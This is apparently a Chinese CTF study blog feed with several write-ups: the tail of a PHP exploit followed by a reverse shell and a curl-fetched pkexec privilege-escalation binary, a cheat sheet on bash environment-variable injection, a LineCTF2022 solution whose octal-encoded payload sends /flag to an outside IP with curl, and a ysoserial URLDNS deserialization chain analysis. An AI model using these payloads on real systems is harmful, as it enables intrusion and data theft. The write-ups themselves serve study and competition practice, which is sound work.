class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanup</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;hfp = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;hfp, <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;QQ&#x27;</span>, <span class="number">0</span>, <span class="variable">$this</span>-&gt;abc_addr));</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; FILTER_SIZE - <span class="number">0x10</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;hfp, <span class="string">&quot;\x00&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params"><span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$address</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$n</span> - <span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$j</span>]);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="variable">$address</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$out</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span></span><br><span class="line"><span class="language-php">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="variable">$out</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$val</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span>(LOGGING) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;<span class="subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="variable">$val</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">alloc</span>(<span class="params"><span class="variable">$size</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="variable">$size</span>));</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/1.117.144.41/4444 &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<p>然后pkexec提权，项目地址：<a href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://120.27.248.81/p &gt; ./p</span><br><span class="line"><span class="built_in">chmod</span> 777 p</span><br><span class="line">./p</span><br></pre></td></tr></table></figure>

<h1 id="gocalc"><a href="#gocalc" class="headerlink" title="gocalc"></a>gocalc</h1><p>go注入未复现，待有时间接触go之后再学，直接学注入肯定效果不好。</p>
]]></content>
      <categories>
        <category>ctfStudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>初识环境变量注入</title>
    <url>/2022/03/31/%E5%88%9D%E8%AF%86%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>来源于p牛的博客<a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>
<p>一周内两个大ctf都涉及到这个点，做下简单整理。</p>
<h1 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h1><h2 id="BASH-ENV"><a href="#BASH-ENV" class="headerlink" title="BASH_ENV"></a>BASH_ENV</h2><p>触发命令：</p>
<p><code>bash</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BASH_ENV=<span class="string">&#x27;$(curl xxxxx)&#x27;</span></span><br><span class="line">BASH_ENV=<span class="string">&#x27;$(id 1&gt;&amp;2)&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h2><p>触发命令：</p>
<p><code>bash -i -c</code>需要两个参数</p>
<p><code>sh -i -c</code> 需要两个参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENV=<span class="string">&#x27;$(id 1&gt;&amp;2)&#x27;</span> dash -i -c <span class="string">&#x27;echo hello&#x27;</span></span><br><span class="line">ENV=<span class="string">&#x27;$(id 1&gt;&amp;2)&#x27;</span> sh -i -c <span class="string">&quot;echo hello&quot;</span></span><br></pre></td></tr></table></figure>


<h2 id="PROMPT-COMMAND"><a href="#PROMPT-COMMAND" class="headerlink" title="PROMPT_COMMAND"></a>PROMPT_COMMAND</h2><p>触发命令</p>
<p><code>bash</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PROMPT_COMMAND=<span class="string">&#x27;id&#x27;</span> bash</span><br></pre></td></tr></table></figure>


<h2 id="PS1"><a href="#PS1" class="headerlink" title="PS1"></a>PS1</h2><p>触发命令</p>
<p><code>bash</code> 需要交互式shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS1=<span class="string">&#x27;$(id)&#x27;</span> bash</span><br></pre></td></tr></table></figure>


<h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_myfunc%%=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&#x27;myfunc&#x27;</span></span><br><span class="line"><span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&#x27;echo hello&#x27;</span></span><br></pre></td></tr></table></figure>

<p>文中给出了突破centos7的方法，也就是Bash 4.4</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如TEST=() &#123; :; &#125;; <span class="built_in">id</span>;</span><br><span class="line">Bash 4.4以前：<span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&quot;echo hello&quot;</span></span><br><span class="line">Bash 4.4及以上：<span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&#x27;echo hello&#x27;</span></span><br></pre></td></tr></table></figure>


<h1 id="LineCTF2022-BB"><a href="#LineCTF2022-BB" class="headerlink" title="[LineCTF2022]BB"></a>[LineCTF2022]BB</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>环境变量注入RCE</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bye</span>(<span class="params"><span class="variable">$s</span>, <span class="variable">$ptn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$ptn</span>, <span class="variable">$s</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">bye</span>(<span class="variable">$k</span>, <span class="string">&quot;/=/i&quot;</span>) &amp;&amp; <span class="title function_ invoke__">bye</span>(<span class="variable">$v</span>, <span class="string">&quot;/[a-zA-Z]/i&quot;</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>=<span class="subst">&#123;$v&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;imdude&#x27;&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">bye</span>(<span class="variable">$k</span>, <span class="string">&quot;/=/i&quot;</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里是bash可以尝试用<code>BASH_ENV</code>来注入</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330201942-1napt67.png" alt="image.png"></p>
<p>但是这里过滤了所有的字母，可以用八进制绕过。</p>
<p><a href="https://twitter.com/DissectMalware/status/1023682809368653826">https://twitter.com/DissectMalware/status/1023682809368653826</a></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330202351-dz5muwd.png" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?env[BASH_ENV]=$($<span class="string">&#x27;\143\165\162\154&#x27;</span>%<span class="number">20</span>$<span class="string">&#x27;\61\56\61\61\67\56\61\64\64\56\64\61\72\64\64\64\64&#x27;</span>)</span><br><span class="line">能外带数据，尝试-F把flag带出来</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?env[BASH_ENV]=$($<span class="string">&#x27;\143\165\162\154&#x27;</span>%<span class="number">20</span>$<span class="string">&#x27;\61\56\61\61\67\56\61\64\64\56\64\61\72\64\64\64\64&#x27;</span>%<span class="number">20</span>$<span class="string">&#x27;\55\106&#x27;</span>%<span class="number">20</span>$<span class="string">&#x27;\146\151\154\145\75\100\57\146\154\141\147&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330205327-2y3i5cn.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>ctfStudy</category>
      </categories>
      <tags>
        <tag>环境变量注入</tag>
      </tags>
  </entry>
  <entry>
    <title>URLDNS链分析</title>
    <url>/2022/03/12/ysoAndUrldns/</url>
    <content><![CDATA[<h1 id="Ysoserial初使用"><a href="#Ysoserial初使用" class="headerlink" title="Ysoserial初使用"></a>Ysoserial初使用</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>项目地址：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/frohoff/ysoserial.git</span></span><br></pre></td></tr></table></figure>

<p>配置maven</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220310174742-c9fnavr.png" alt="image.png"></p>
<p>然后用maven自动导包进去</p>
<p>运行主函数，编译运行正常</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220310180352-zvydk4e.png" alt="image.png"></p>
<h3 id="处理了一个报错"><a href="#处理了一个报错" class="headerlink" title="处理了一个报错"></a>处理了一个报错</h3><p>当时所有的包都无法导入</p>
<p><a href="https://blog.csdn.net/q5926167/article/details/119318876">https://blog.csdn.net/q5926167/article/details/119318876</a></p>
<p>终于参考这里的文章解决了</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>使用yo生成反序列化payload：</p>
<h3 id="方法1-IDEA添加参数-amp-写入文件"><a href="#方法1-IDEA添加参数-amp-写入文件" class="headerlink" title="方法1 IDEA添加参数&amp;写入文件"></a>方法1 IDEA添加参数&amp;写入文件</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220311191241-upfalib.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220311222625-bg86lvl.png" alt="image.png"></p>
<p>打印出的payload不能直接用</p>
<p>所以在序列化完之后写入本地文件，这里序列化对象时重写了writeObject方法，就和反序列化思路一样，我们在这个方法的最后添加一段用来输出为本地文件的功能</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220311224029-yhcjuwb.png" alt="image.png"></p>
<p>如此payload保存到1.ser中，以便我们后续使用</p>
<h2 id="方法2-打包成jar"><a href="#方法2-打包成jar" class="headerlink" title="方法2 打包成jar"></a>方法2 打包成jar</h2><h2 id="payload测试-amp-传值"><a href="#payload测试-amp-传值" class="headerlink" title="payload测试&amp;传值"></a>payload测试&amp;传值</h2><p>我们尝试使用我们刚刚创建的cc来攻击本地server</p>
<p>jdk1.7+tomcat8.5搭建环境</p>
<p>写一个简单的Servlet，doPost中反序列化传来的数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletInputStream</span> <span class="variable">is</span> <span class="operator">=</span> req.getInputStream();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(is);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在web.xml中配置路由</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Test1<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.study.TestServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Test1<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>maven中导入存在漏洞的包：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>启动tomcat，部署页面，用curl传值</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312064105-2i424nu.png" alt="image.png"></p>
<p>成功触发漏洞，说明环境正确，ysoserial生成payload正确</p>
<h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><h2 id="利用ysoserial生成urldns-payload"><a href="#利用ysoserial生成urldns-payload" class="headerlink" title="利用ysoserial生成urldns payload"></a>利用ysoserial生成urldns payload</h2><p>环境就是测试搭建ysoserial一文中搭建的webserver</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312091551-lfbq6gm.png" alt="image.png"></p>
<p>修改参数，生成payload，然后传入webserver</p>
<p>可以看到有dnslog记录，复现成功，下面开始调试分析</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312091918-o7vlp4z.png" alt="image.png"></p>
<h2 id="HashMap类"><a href="#HashMap类" class="headerlink" title="HashMap类"></a>HashMap类</h2><p>HashMap的基本用法 <a href="https://blog.csdn.net/wxgxgp/article/details/79194360">https://blog.csdn.net/wxgxgp/article/details/79194360</a></p>
<p>HashMap的实现原理<a href="https://wiki.jikexueyuan.com/project/java-collection/hashmap.html">https://wiki.jikexueyuan.com/project/java-collection/hashmap.html</a></p>
<p>HashMap的数据结构：</p>
<p>HashMap实际上是一个“链表散列”的数据结构，即数组和链表的结合体</p>
<p>从下图中可以看出，HashMap 底层就是一个数组结构，数组中的每一项又是一个链表。当新建一个 HashMap 的时候，就会初始化一个数组。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312110057-4db9nk8.png" alt="image.png"></p>
<h1 id="调试URLDNS利用链"><a href="#调试URLDNS利用链" class="headerlink" title="调试URLDNS利用链"></a>调试URLDNS利用链</h1><h2 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h2><p>通过ysoserial和我们动态调试可以得到：</p>
<p>URLDNS链的起点也是根源在HashMap的readObject方法，我们知道java中，反序列化漏洞的触发入口一般都在重写的readObject方法中，因此我们从这里下手</p>
<p>在servelt的反序列化方法那里打上断点</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312163043-16y0mo6.png" alt="image.png"></p>
<p>跟进到readObject方法里面，在readObject0处断点</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312163142-nmjrjtb.png" alt="image.png"></p>
<p>几步步过之后，来到了HashMap.readObject，这也是URLDNS的入口</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312163248-m1v4jn1.png" alt="image.png"></p>
<p>下面就是在readObject方法里面动态调试</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312163707-ov12gsk.png" alt="image.png"></p>
<p>java.io.ObjectInputStream.defaultReadObject() 方法从该流中读取当前类的非静态和非瞬态字段。这也许只能称为从类反序列化readObject方法。它会抛出NotActiveException如果它被调用。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312163754-i535zpc.png" alt="image.png"></p>
<p>这里的判断跳过</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312163935-ynpisge.png" alt="image.png"></p>
<p>下面是一系列初始化HashMap的操作，创建空数组，然后计算capacity，这里没有什么特别的地方</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312164237-qlhmnmg.png" alt="image.png"></p>
<p>开始遍历键值对</p>
<h2 id="HashMap-putForCreate"><a href="#HashMap-putForCreate" class="headerlink" title="HashMap.putForCreate()"></a>HashMap.putForCreate()</h2><p>这里步入</p>
<p>HashMap.putForCreate()方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312164405-lk6bgzi.png" alt="image.png"></p>
<p>可以看到是计算哈希的方法，我们步入这个hash方法</p>
<blockquote>
<p>第一次分析的时候，认为hash方法可能是个没啥用就计算的方法，没有跟进去看，略过了。</p>
<p>所以要细心，不能遗漏</p>
</blockquote>
<h2 id="HashMap-hash"><a href="#HashMap-hash" class="headerlink" title="HashMap.hash()"></a>HashMap.hash()</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312165450-3lrg6fo.png" alt="image.png"></p>
<p>我们dns查询的网址被当作一个URL对象传入</p>
<p>这里hashSeed为0，略过那个if</p>
<p>步入下面的362行的hashCode方法</p>
<h2 id="java-net-URL-hashCode"><a href="#java-net-URL-hashCode" class="headerlink" title="java.net.URL.hashCode()"></a>java.net.URL.hashCode()</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312170053-qqhi6pa.png" alt="image.png"></p>
<h3 id="hashCode-x3D-1"><a href="#hashCode-x3D-1" class="headerlink" title="hashCode !&#x3D; -1"></a>hashCode !&#x3D; -1</h3><p>878行的判断条件<code>hashCode != -1</code> </p>
<p>当我们正常传入反序列化对象时，他会在反序列化读取给key赋值的时候，改变hashCode的值</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312203357-h2m0w54.png" alt="image.png"></p>
<p>因此在构造payload的时候要手动让这个条件为true</p>
<p>步入这里的hashCode方法</p>
<h2 id="java-net-URLStreamHandler-hashCode"><a href="#java-net-URLStreamHandler-hashCode" class="headerlink" title="java.net.URLStreamHandler.hashCode"></a>java.net.URLStreamHandler.hashCode</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312170440-glwq0e4.png" alt="image.png"></p>
<p>根据绿字描述，这个方法是根据URL对象的不同协议和需求，生成一个供哈希表索引的一个hashcode返回</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312170645-lg4eim2.png" alt="image.png"></p>
<p>根据协议计算hashCode加到h上</p>
<p>hashCode方法就是位运算生成hash值</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312170846-zvpzdq6.png" alt="image.png"></p>
<p>步入他获取域名的方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312170952-ql6vn1r.png" alt="image.png"></p>
<h2 id="java-net-URLStreamHandler-getHostAddress"><a href="#java-net-URLStreamHandler-getHostAddress" class="headerlink" title="java.net.URLStreamHandler.getHostAddress"></a>java.net.URLStreamHandler.getHostAddress</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312171047-gq3qkzd.png" alt="image.png"></p>
<p>第一个if判断跳过，然后getHost方法获取host</p>
<p>跟进getHost方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312171214-d34nvm2.png" alt="image.png"></p>
<p>步入getByName方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312171258-qkpcdxx.png" alt="image.png"></p>
<h2 id="java-net-InetAddress-getByName-java-lang-String"><a href="#java-net-InetAddress-getByName-java-lang-String" class="headerlink" title="java.net.InetAddress.getByName(java.lang.String)"></a>java.net.InetAddress.getByName(java.lang.String)</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312171402-0032f1y.png" alt="image.png"></p>
<p>继续步入getAllByName方法</p>
<h2 id="java-net-InetAddress-getAllByName"><a href="#java-net-InetAddress-getAllByName" class="headerlink" title="java.net.InetAddress.getAllByName()"></a>java.net.InetAddress.getAllByName()</h2><p>java.net.InetAddress.getAllByName(java.lang.String)</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312171519-h0hgx3v.png" alt="image.png"></p>
<p>java.net.InetAddress.getAllByName(java.lang.String, java.net.InetAddress)</p>
<p>进这个重载方法，参数reqAddr为null</p>
<p>第一个if判断，由于host不为空，跳过</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312172113-1squv8q.png" alt="image.png"></p>
<p>第二个判断，我们的host开头不是[，跳过ipv6的判断</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312205132-6ak10uy.png" alt="image.png"></p>
<p>第三个判断，根据注释可以了解到如果传入host的是ip地址，就不会进行lookup，也就是dns查询</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312205425-rnqdcn2.png" alt="image.png"></p>
<p>addr&#x3D;&#x3D;null时，进到这个if里面后面的都跳过了</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312172320-p3wfvxk.png" alt="image.png"></p>
<p>一直到最后的getAllByName0()，进行域名解析工作</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312172546-4jjow4r.png" alt="image.png"></p>
<h2 id="java-net-InetAddress-getAllByName0-java-lang-String-java-net-InetAddress-boolean"><a href="#java-net-InetAddress-getAllByName0-java-lang-String-java-net-InetAddress-boolean" class="headerlink" title="java.net.InetAddress.getAllByName0(java.lang.String, java.net.InetAddress, boolean)"></a>java.net.InetAddress.getAllByName0(java.lang.String, java.net.InetAddress, boolean)</h2><p>security返回null</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312205912-c1zr83z.png" alt="image.png"></p>
<br />

<p>下面是查找有没有查询缓存，如果有的话会直接返回缓存地址数组</p>
<p>这里我们得让addresses为null，才能步入getAddressFromNameService方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312210114-m9nk487.png" alt="image.png"></p>
<p>跟进getAddressFromNameService方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312174123-fmzl0c2.png" alt="image.png"></p>
<h2 id="java-net-InetAddress-getAddressesFromNameService"><a href="#java-net-InetAddress-getAddressesFromNameService" class="headerlink" title="java.net.InetAddress.getAddressesFromNameService"></a>java.net.InetAddress.getAddressesFromNameService</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312174251-rkc74bn.png" alt="image.png"></p>
<p>一开始初始一些变量的值</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312174332-othrj9k.png" alt="image.png"></p>
<p><br /><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312174425-bb0w2p4.png" alt="image.png"></p>
<p>判断host是否在table里面</p>
<p>然后跟进到下面的遍历</p>
<p>跟进lookupAllHostAddr方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312174528-lr6rbx8.png" alt="image.png"></p>
<p>其实到这一步，已经完成了一次dns查询，这条链子也就到头了</p>
<p><a href="https://developer.aliyun.com/article/441171">java中实现dns查询的原理</a></p>
<h1 id="分析URLDNS构造链"><a href="#分析URLDNS构造链" class="headerlink" title="分析URLDNS构造链"></a>分析URLDNS构造链</h1><p>调试结束，我们如何构造呢</p>
